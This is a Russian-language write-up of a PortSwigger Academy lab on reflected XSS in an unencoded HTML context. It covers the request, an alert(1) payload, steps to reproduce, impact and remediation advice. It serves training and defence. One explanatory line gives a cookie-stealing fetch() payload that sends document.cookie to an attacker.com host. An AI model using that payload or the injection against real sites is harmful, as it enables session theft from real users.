# Reflected XSS — HTML-контекст без кодирования

**Источник:** PortSwigger Web Security Academy
**Лаба:** Reflected XSS into HTML context with nothing encoded
**Сложность:** Apprentice
**Категория:** Cross-Site Scripting (XSS) → Reflected
**Статус:** Solved

## Цель
Выполнить reflected XSS-атаку, вызывающую `alert(1)`.

## Окружение
- Лаба PortSwigger Web Security Academy
- Burp Suite + Burp browser
- Аутентификация не требуется

## Уязвимость
Функция поиска отражает параметр `search` из query-строки в HTML-ответ **без какой-либо кодировки или экранирования**. Любой HTML/JS, переданный в параметре, рендерится и исполняется браузером как есть.

Запрос:
```
GET /?search=<script>alert(1)</script> HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

Ответ (фрагмент):
```html
<h1>0 search results for '<script>alert(1)</script>'</h1>
```

## Payload
```html
<script>alert(1)</script>
```

## Шаги воспроизведения
1. Открыть лабу в Burp browser: `https://LAB-ID.web-security-academy.net/`
2. В поле "Search the blog..." вставить:
   ```
   <script>alert(1)</script>
   ```
3. Нажать иконку поиска (или Enter).
4. Браузер исполняет внедрённый скрипт → всплывает `alert(1)`.
5. Лаба решена (зелёный баннер "Congratulations, you solved the lab!").

## Почему это работает (для чайника)
1. Сервер берёт значение параметра `search` и вставляет его в HTML-ответ **дословно** — без `htmlspecialchars()`, без автоэкранирования шаблонизатора.
2. Браузер парсит ответ, видит `<script>` и исполняет JavaScript внутри тега.
3. `alert(1)` безобиден, но в ту же точку инъекции можно подставить `fetch('https://attacker.com/?c='+document.cookie)` → кража сессии, или `fetch('/api/...')` → действия от имени жертвы (CSRF-подобные).
4. Отражение происходит в **немедленном ответе** на специально сформированную ссылку — атакующему достаточно, чтобы жертва кликнула по ней.

## Влияние
Атакующий может сформировать URL, при открытии которого в браузере жертвы исполнится произвольный JavaScript **в контексте уязвимого origin**. Это позволяет:
- Похищать session cookies / токены (если не выставлен `HttpOnly`)
- Выполнять действия от имени жертвы (CSRF-подобные)
- Накладывать фишинговые оверлеи, кейлоггерить, перенаправлять
- Читать данные, доступные жертве на этом origin

Severity: **High** в реальном приложении (зависит от прав сессии).

## Рекомендации по устранению
1. **HTML-энкодить весь пользовательский ввод в HTML-контексте** перед вставкой в ответ:
   - `<` → `&lt;`
   - `>` → `&gt;`
   - `&` → `&amp;`
   - `"` → `&quot;`
   - `'` → `&#x27;`
2. **Использовать шаблонизатор с автоэкранированием** (Twig, Jinja2, Handlebars, React JSX, Angular, Razor).
3. **Контекстно-зависимое экранирование** — разная кодировка для HTML, атрибутов, JS, CSS, URL-контекстов.
4. **Content-Security-Policy** как эшелонированная защита (например, `script-src 'self'` без `unsafe-inline`).
5. **Флаг `HttpOnly`** на cookie — XSS не предотвращает, но снижает ущерб от кражи cookie.

## Ссылки
- PortSwigger — [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- PortSwigger — [XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- OWASP — [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
